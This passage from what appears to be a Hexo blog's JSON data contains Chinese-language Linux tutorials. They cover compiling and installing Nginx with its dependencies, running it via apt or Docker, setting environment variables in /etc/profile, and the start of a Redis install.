class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">tar</span> <span class=\"token parameter variable\">-zxvf</span> zlib-1.2.11.tar.gz  <span class=\"token parameter variable\">-C</span> /usr/local/nginx/package/\n<span class=\"token comment\"># 下载pcre 是一个支持正则表达式的模块(www.pcre.org) 必须下载</span>\n<span class=\"token function\">wget</span> http://nobibibi.top/somg/file/nginx/linux/pcre-8.42.tar.gz <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">tar</span> <span class=\"token parameter variable\">-zxvf</span> pcre-8.42.tar.gz  <span class=\"token parameter variable\">-C</span> /usr/local/nginx/package/<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<blockquote>\n<p>命令安装依赖</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">yum <span class=\"token parameter variable\">-y</span> <span class=\"token function\">install</span> pcre pcre-devel zlib openssl openssl-devel<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"安装Nginx\"><a href=\"#安装Nginx\" class=\"headerlink\" title=\"安装Nginx\"></a>安装Nginx</h3><h4 id=\"全编译安装\"><a href=\"#全编译安装\" class=\"headerlink\" title=\"全编译安装\"></a>全编译安装</h4><blockquote>\n<p>下载nginx</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">cd</span> /home/nginxInstallPackage\n\n<span class=\"token function\">wget</span> http://nobibibi.top/somg/file/nginx/linux/nginx-1.20.2.tar.gz <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">tar</span> <span class=\"token parameter variable\">-zxvf</span> nginx-1.20.2.tar.gz <span class=\"token parameter variable\">-C</span> /usr/local/nginx/package/ <span class=\"token comment\"># 下载nginx</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>执行<code>configure</code></p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">cd</span> /usr/local/nginx/package/nginx-1.20.2\n\n./configure <span class=\"token parameter variable\">--prefix</span><span class=\"token operator\">=</span>/usr/local/nginx <span class=\"token punctuation\">\\</span>\n\t--with-http_ssl_module --with-openssl<span class=\"token operator\">=</span><span class=\"token punctuation\">..</span>/openssl-1.1.1l <span class=\"token punctuation\">\\</span>\n    --with-pcre<span class=\"token operator\">=</span><span class=\"token punctuation\">..</span>/pcre-8.42 <span class=\"token punctuation\">\\</span>\n    --with-zlib<span class=\"token operator\">=</span><span class=\"token punctuation\">..</span>/zlib-1.2.11 <span class=\"token comment\"># 执行</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>编译并安装nginx</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">make</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">make</span> <span class=\"token function\">install</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"命令安装依赖方式编译安装\"><a href=\"#命令安装依赖方式编译安装\" class=\"headerlink\" title=\"命令安装依赖方式编译安装\"></a>命令安装依赖方式编译安装</h4><blockquote>\n<p>下载nginx</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">cd</span> /home/nginxInstallPackage\n\n<span class=\"token function\">wget</span> http://nobibibi.top/somg/file/nginx/linux/nginx-1.20.2.tar.gz <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">tar</span> <span class=\"token parameter variable\">-zxvf</span> nginx-1.20.2.tar.gz <span class=\"token parameter variable\">-C</span> /usr/local/nginx/package/ <span class=\"token comment\"># 下载nginx</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>执行<code>configure</code></p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">cd</span> /usr/local/nginx/package/nginx-1.20.2\n\n./configure <span class=\"token parameter variable\">--prefix</span><span class=\"token operator\">=</span>/usr/local/nginx <span class=\"token comment\"># 执行</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>编译并安装nginx</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">make</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">make</span> <span class=\"token function\">install</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"nginx结构\"><a href=\"#nginx结构\" class=\"headerlink\" title=\"nginx结构\"></a>nginx结构</h3><p>安装后所有的文件都在<code>/usr/local/nginx</code>下面</p>\n<blockquote>\n<p><code>sbin</code>存放nginx命令</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">cd</span> sbin\n\n./nginx <span class=\"token comment\"># 启动 </span>\n\n./nginx <span class=\"token parameter variable\">-s</span> reload <span class=\"token comment\"># 重启</span>\n\n./nginx <span class=\"token parameter variable\">-s</span> stop <span class=\"token comment\"># 关闭 </span>\n\n<span class=\"token function\">pkill</span> <span class=\"token parameter variable\">-9</span> nginx <span class=\"token comment\"># 强制关闭</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p><code>conf</code></p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">cat</span> nginx.conf <span class=\"token comment\"># nginx默认配置</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p><code>html</code>是静态文件目录</p>\n</blockquote>\n<h3 id=\"其他安装方式\"><a href=\"#其他安装方式\" class=\"headerlink\" title=\"其他安装方式\"></a>其他安装方式</h3><h4 id=\"通过命令行安装\"><a href=\"#通过命令行安装\" class=\"headerlink\" title=\"通过命令行安装\"></a>通过命令行安装</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">apt</span> <span class=\"token function\">install</span> nginx \n/etc/init.d/nginx start <span class=\"token comment\"># 启动 </span>\n/etc/init.d/nginx stop <span class=\"token comment\"># 停止 </span>\n/etc/init.d/nginx restart <span class=\"token comment\"># 重启</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"通过docker安装\"><a href=\"#通过docker安装\" class=\"headerlink\" title=\"通过docker安装\"></a>通过docker安装</h4><blockquote>\n<p>获取镜像</p>\n</blockquote>\n<pre class=\"line-numbers language-shelll\" data-language=\"shelll\"><code class=\"language-shelll\">docker pull nginx<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>运行镜像</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">docker</span> run <span class=\"token parameter variable\">-itd</span> <span class=\"token parameter variable\">-p</span> <span class=\"token number\">80</span>:80 <span class=\"token parameter variable\">--name</span> nginx <span class=\"token parameter variable\">--restart</span> always nginx<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>进入容器执行命令</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">docker</span> <span class=\"token builtin class-name\">exec</span> <span class=\"token parameter variable\">-it</span> nginx /bin/bash <span class=\"token parameter variable\">-c</span> <span class=\"token string\">\"一个或者多个命令\"</span> <span class=\"token comment\"># 不进入容器执行命令</span>\n\n<span class=\"token function\">docker</span> <span class=\"token builtin class-name\">exec</span> <span class=\"token parameter variable\">-it</span> nginx /bin/bash <span class=\"token comment\"># 进入容器执行命令</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>复制</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">docker</span> <span class=\"token function\">cp</span> /home/default.conf nginx:/etc/nginx/conf.d/ <span class=\"token comment\"># 将宿主机的文件复制到容器内</span>\n<span class=\"token function\">docker</span> <span class=\"token function\">cp</span> nginx:/etc/nginx/conf.d/default.conf /home/ <span class=\"token comment\"># 将容器中的文件复制到宿主机</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>容器管理</p>\n</blockquote>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">docker start nginx   # 启动\ndocker stop nginx\t # 停止\ndocker restart nginx # 重启<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>修改容器配置</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">docker</span> container update <span class=\"token parameter variable\">--restart</span><span class=\"token operator\">=</span>always nginx\n<span class=\"token function\">docker</span> restart nginx <span class=\"token comment\"># 重启</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Linux-Install-Nginx\"><a href=\"#Linux-Install-Nginx\" class=\"headerlink\" title=\"Linux Install Nginx\"></a>Linux Install Nginx</h2><h3 id=\"安装之前\"><a href=\"#安装之前\" class=\"headerlink\" title=\"安装之前\"></a>安装之前</h3><blockquote>\n<p>安装编译工具</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">yum <span class=\"token function\">install</span> <span class=\"token parameter variable\">-y</span> gcc-c++<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>创建nginx安装目录</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">mkdir</span> /usr/local/nginx <span class=\"token comment\"># nginx安装到这里</span>\n<span class=\"token function\">mkdir</span> /usr/local/nginx/package <span class=\"token comment\"># 需要的依赖包放在这里 如果要全编译安装的话就需要这个文件夹</span>\n<span class=\"token function\">mkdir</span> /home/nginxInstallPackage <span class=\"token comment\"># 创建nginx安装包或者依赖包目录</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"下载相关依赖\"><a href=\"#下载相关依赖\" class=\"headerlink\" title=\"下载相关依赖\"></a>下载相关依赖</h3><blockquote>\n<p>全编译安装下载依赖</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">cd</span> /home/nginxInstallPackage\n<span class=\"token comment\"># 下载openssl 支持nginx开通https的模块 非对称加密的工具(https://www.openssl.org/) 选择性下载</span>\n<span class=\"token function\">wget</span> http://nobibibi.top/somg/file/nginx/linux/openssl-1.1.1l.tar.gz <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">tar</span> <span class=\"token parameter variable\">-zxvf</span> openssl-1.1.1l.tar.gz <span class=\"token parameter variable\">-C</span> /usr/local/nginx/package/\n<span class=\"token comment\"># 下载zlib 是一款支持zlib压缩的模块(zlib.net) 必须下载</span>\n<span class=\"token function\">wget</span> http://nobibibi.top/somg/file/nginx/linux/zlib-1.2.11.tar.gz <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">tar</span> <span class=\"token parameter variable\">-zxvf</span> zlib-1.2.11.tar.gz  <span class=\"token parameter variable\">-C</span> /usr/local/nginx/package/\n<span class=\"token comment\"># 下载pcre 是一个支持正则表达式的模块(www.pcre.org) 必须下载</span>\n<span class=\"token function\">wget</span> http://nobibibi.top/somg/file/nginx/linux/pcre-8.42.tar.gz <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">tar</span> <span class=\"token parameter variable\">-zxvf</span> pcre-8.42.tar.gz  <span class=\"token parameter variable\">-C</span> /usr/local/nginx/package/<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<blockquote>\n<p>命令安装依赖</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">yum <span class=\"token parameter variable\">-y</span> <span class=\"token function\">install</span> pcre pcre-devel zlib openssl openssl-devel<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"安装Nginx\"><a href=\"#安装Nginx\" class=\"headerlink\" title=\"安装Nginx\"></a>安装Nginx</h3><h4 id=\"全编译安装\"><a href=\"#全编译安装\" class=\"headerlink\" title=\"全编译安装\"></a>全编译安装</h4><blockquote>\n<p>下载nginx</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">cd</span> /home/nginxInstallPackage\n\n<span class=\"token function\">wget</span> http://nobibibi.top/somg/file/nginx/linux/nginx-1.20.2.tar.gz <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">tar</span> <span class=\"token parameter variable\">-zxvf</span> nginx-1.20.2.tar.gz <span class=\"token parameter variable\">-C</span> /usr/local/nginx/package/ <span class=\"token comment\"># 下载nginx</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>执行<code>configure</code></p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">cd</span> /usr/local/nginx/package/nginx-1.20.2\n\n./configure <span class=\"token parameter variable\">--prefix</span><span class=\"token operator\">=</span>/usr/local/nginx <span class=\"token punctuation\">\\</span>\n\t--with-http_ssl_module --with-openssl<span class=\"token operator\">=</span><span class=\"token punctuation\">..</span>/openssl-1.1.1l <span class=\"token punctuation\">\\</span>\n    --with-pcre<span class=\"token operator\">=</span><span class=\"token punctuation\">..</span>/pcre-8.42 <span class=\"token punctuation\">\\</span>\n    --with-zlib<span class=\"token operator\">=</span><span class=\"token punctuation\">..</span>/zlib-1.2.11 <span class=\"token comment\"># 执行</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>编译并安装nginx</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">make</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">make</span> <span class=\"token function\">install</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"命令安装依赖方式编译安装\"><a href=\"#命令安装依赖方式编译安装\" class=\"headerlink\" title=\"命令安装依赖方式编译安装\"></a>命令安装依赖方式编译安装</h4><blockquote>\n<p>下载nginx</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">cd</span> /home/nginxInstallPackage\n\n<span class=\"token function\">wget</span> http://nobibibi.top/somg/file/nginx/linux/nginx-1.20.2.tar.gz <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">tar</span> <span class=\"token parameter variable\">-zxvf</span> nginx-1.20.2.tar.gz <span class=\"token parameter variable\">-C</span> /usr/local/nginx/package/ <span class=\"token comment\"># 下载nginx</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>执行<code>configure</code></p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">cd</span> /usr/local/nginx/package/nginx-1.20.2\n\n./configure <span class=\"token parameter variable\">--prefix</span><span class=\"token operator\">=</span>/usr/local/nginx <span class=\"token comment\"># 执行</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>编译并安装nginx</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">make</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">make</span> <span class=\"token function\">install</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"nginx结构\"><a href=\"#nginx结构\" class=\"headerlink\" title=\"nginx结构\"></a>nginx结构</h3><p>安装后所有的文件都在<code>/usr/local/nginx</code>下面</p>\n<blockquote>\n<p><code>sbin</code>存放nginx命令</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">cd</span> sbin\n\n./nginx <span class=\"token comment\"># 启动 </span>\n\n./nginx <span class=\"token parameter variable\">-s</span> reload <span class=\"token comment\"># 重启</span>\n\n./nginx <span class=\"token parameter variable\">-s</span> stop <span class=\"token comment\"># 关闭 </span>\n\n<span class=\"token function\">pkill</span> <span class=\"token parameter variable\">-9</span> nginx <span class=\"token comment\"># 强制关闭</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p><code>conf</code></p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">cat</span> nginx.conf <span class=\"token comment\"># nginx默认配置</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p><code>html</code>是静态文件目录</p>\n</blockquote>\n<h3 id=\"其他安装方式\"><a href=\"#其他安装方式\" class=\"headerlink\" title=\"其他安装方式\"></a>其他安装方式</h3><h4 id=\"通过命令行安装\"><a href=\"#通过命令行安装\" class=\"headerlink\" title=\"通过命令行安装\"></a>通过命令行安装</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">apt</span> <span class=\"token function\">install</span> nginx \n/etc/init.d/nginx start <span class=\"token comment\"># 启动 </span>\n/etc/init.d/nginx stop <span class=\"token comment\"># 停止 </span>\n/etc/init.d/nginx restart <span class=\"token comment\"># 重启</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"通过docker安装\"><a href=\"#通过docker安装\" class=\"headerlink\" title=\"通过docker安装\"></a>通过docker安装</h4><blockquote>\n<p>获取镜像</p>\n</blockquote>\n<pre class=\"line-numbers language-shelll\" data-language=\"shelll\"><code class=\"language-shelll\">docker pull nginx<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>运行镜像</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">docker</span> run <span class=\"token parameter variable\">-itd</span> <span class=\"token parameter variable\">-p</span> <span class=\"token number\">80</span>:80 <span class=\"token parameter variable\">--name</span> nginx <span class=\"token parameter variable\">--restart</span> always nginx<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>进入容器执行命令</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">docker</span> <span class=\"token builtin class-name\">exec</span> <span class=\"token parameter variable\">-it</span> nginx /bin/bash <span class=\"token parameter variable\">-c</span> <span class=\"token string\">\"一个或者多个命令\"</span> <span class=\"token comment\"># 不进入容器执行命令</span>\n\n<span class=\"token function\">docker</span> <span class=\"token builtin class-name\">exec</span> <span class=\"token parameter variable\">-it</span> nginx /bin/bash <span class=\"token comment\"># 进入容器执行命令</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>复制</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">docker</span> <span class=\"token function\">cp</span> /home/default.conf nginx:/etc/nginx/conf.d/ <span class=\"token comment\"># 将宿主机的文件复制到容器内</span>\n<span class=\"token function\">docker</span> <span class=\"token function\">cp</span> nginx:/etc/nginx/conf.d/default.conf /home/ <span class=\"token comment\"># 将容器中的文件复制到宿主机</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>容器管理</p>\n</blockquote>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">docker start nginx   # 启动\ndocker stop nginx\t # 停止\ndocker restart nginx # 重启<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>修改容器配置</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">docker</span> container update <span class=\"token parameter variable\">--restart</span><span class=\"token operator\">=</span>always nginx\n<span class=\"token function\">docker</span> restart nginx <span class=\"token comment\"># 重启</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n"},{"title":"Linux环境变量配置","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-05-09T22:42:53.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"Linux环境变量配置","_content":"\n### Linux配置环境变量\n\n> 以`/etc/profile`为例\n\n```shell\n# 只配置一个环境变量如java \nexport JAVA_HOME=xxxxxxxxxxxxxxxx # 添加一个变量 路径\nexport PATH=$PATH:$JAVA_HOME/bin # 给PATH添加一个变量,$表示引用,这里可以使用配好的路径变量也可以直接写路径 \n\n# 配置多个环境变量 \nexport JAVA_HOME=xxxxxxxxxxxxxxxx # 添加一个变量 路径 \nexport REDIS_HOME=xxxxxxxxxxxxxxxx # 添加一个变量 路径 \nexport MAVEN_HOME=xxxxxxxxxxxxxxxx # 添加一个变量 路径\nexport NODE_HOME=xxxxxxxxxxxxxxxx # 添加一个变量 路径 \nexport PATH=$PATH:$JAVA_HOME/bin:$REDIS_HOME/bin:$MAVEN_HOME/bin:$NODE_HOME/bin # 配置多个环境变量的时候可以用`:`分割,放在同一行\n```\n","source":"_posts/Linux环境变量配置.md","raw":"---\ntitle: Linux环境变量配置\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-05-10 06:42:53\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: Linux环境变量配置\ntags: 环境变量\ncategories: Linux\n---\n\n### Linux配置环境变量\n\n> 以`/etc/profile`为例\n\n```shell\n# 只配置一个环境变量如java \nexport JAVA_HOME=xxxxxxxxxxxxxxxx # 添加一个变量 路径\nexport PATH=$PATH:$JAVA_HOME/bin # 给PATH添加一个变量,$表示引用,这里可以使用配好的路径变量也可以直接写路径 \n\n# 配置多个环境变量 \nexport JAVA_HOME=xxxxxxxxxxxxxxxx # 添加一个变量 路径 \nexport REDIS_HOME=xxxxxxxxxxxxxxxx # 添加一个变量 路径 \nexport MAVEN_HOME=xxxxxxxxxxxxxxxx # 添加一个变量 路径\nexport NODE_HOME=xxxxxxxxxxxxxxxx # 添加一个变量 路径 \nexport PATH=$PATH:$JAVA_HOME/bin:$REDIS_HOME/bin:$MAVEN_HOME/bin:$NODE_HOME/bin # 配置多个环境变量的时候可以用`:`分割,放在同一行\n```\n","slug":"Linux环境变量配置","published":1,"updated":"2023-05-10T00:23:53.092Z","_id":"clhgy9swe00050gvggjkmawl6","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"Linux配置环境变量\"><a href=\"#Linux配置环境变量\" class=\"headerlink\" title=\"Linux配置环境变量\"></a>Linux配置环境变量</h3><blockquote>\n<p>以<code>/etc/profile</code>为例</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 只配置一个环境变量如java </span>\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">JAVA_HOME</span><span class=\"token operator\">=</span>xxxxxxxxxxxxxxxx <span class=\"token comment\"># 添加一个变量 路径</span>\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\"><span class=\"token environment constant\">PATH</span></span><span class=\"token operator\">=</span><span class=\"token environment constant\">$PATH</span><span class=\"token builtin class-name\">:</span><span class=\"token variable\">$JAVA_HOME</span>/bin <span class=\"token comment\"># 给PATH添加一个变量,$表示引用,这里可以使用配好的路径变量也可以直接写路径 </span>\n\n<span class=\"token comment\"># 配置多个环境变量 </span>\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">JAVA_HOME</span><span class=\"token operator\">=</span>xxxxxxxxxxxxxxxx <span class=\"token comment\"># 添加一个变量 路径 </span>\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">REDIS_HOME</span><span class=\"token operator\">=</span>xxxxxxxxxxxxxxxx <span class=\"token comment\"># 添加一个变量 路径 </span>\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">MAVEN_HOME</span><span class=\"token operator\">=</span>xxxxxxxxxxxxxxxx <span class=\"token comment\"># 添加一个变量 路径</span>\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">NODE_HOME</span><span class=\"token operator\">=</span>xxxxxxxxxxxxxxxx <span class=\"token comment\"># 添加一个变量 路径 </span>\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\"><span class=\"token environment constant\">PATH</span></span><span class=\"token operator\">=</span><span class=\"token environment constant\">$PATH</span><span class=\"token builtin class-name\">:</span><span class=\"token variable\">$JAVA_HOME</span>/bin:<span class=\"token variable\">$REDIS_HOME</span>/bin:<span class=\"token variable\">$MAVEN_HOME</span>/bin:<span class=\"token variable\">$NODE_HOME</span>/bin <span class=\"token comment\"># 配置多个环境变量的时候可以用`:`分割,放在同一行</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"Linux配置环境变量\"><a href=\"#Linux配置环境变量\" class=\"headerlink\" title=\"Linux配置环境变量\"></a>Linux配置环境变量</h3><blockquote>\n<p>以<code>/etc/profile</code>为例</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 只配置一个环境变量如java </span>\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">JAVA_HOME</span><span class=\"token operator\">=</span>xxxxxxxxxxxxxxxx <span class=\"token comment\"># 添加一个变量 路径</span>\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\"><span class=\"token environment constant\">PATH</span></span><span class=\"token operator\">=</span><span class=\"token environment constant\">$PATH</span><span class=\"token builtin class-name\">:</span><span class=\"token variable\">$JAVA_HOME</span>/bin <span class=\"token comment\"># 给PATH添加一个变量,$表示引用,这里可以使用配好的路径变量也可以直接写路径 </span>\n\n<span class=\"token comment\"># 配置多个环境变量 </span>\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">JAVA_HOME</span><span class=\"token operator\">=</span>xxxxxxxxxxxxxxxx <span class=\"token comment\"># 添加一个变量 路径 </span>\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">REDIS_HOME</span><span class=\"token operator\">=</span>xxxxxxxxxxxxxxxx <span class=\"token comment\"># 添加一个变量 路径 </span>\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">MAVEN_HOME</span><span class=\"token operator\">=</span>xxxxxxxxxxxxxxxx <span class=\"token comment\"># 添加一个变量 路径</span>\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">NODE_HOME</span><span class=\"token operator\">=</span>xxxxxxxxxxxxxxxx <span class=\"token comment\"># 添加一个变量 路径 </span>\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\"><span class=\"token environment constant\">PATH</span></span><span class=\"token operator\">=</span><span class=\"token environment constant\">$PATH</span><span class=\"token builtin class-name\">:</span><span class=\"token variable\">$JAVA_HOME</span>/bin:<span class=\"token variable\">$REDIS_HOME</span>/bin:<span class=\"token variable\">$MAVEN_HOME</span>/bin:<span class=\"token variable\">$NODE_HOME</span>/bin <span class=\"token comment\"># 配置多个环境变量的时候可以用`:`分割,放在同一行</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n"},{"title":"Linux安装redis","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-05-09T22:35:04.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"Linux Install Redis","_content":"\n## Linux Install Redis\n### GET REDIS\n> 下载稳定版Redis\n\n```shell\n# 官网\nwget https://download.redis.io/redis-stable.tar.gz\n# 或者\nwget http://nobibibi.top/somg/file/redis/linux/redis-stable.tar.gz\n```\n\n> 解压Redis到`/usr/local/redis/`\n\n```shell\nmkdir /usr/local/redis/ 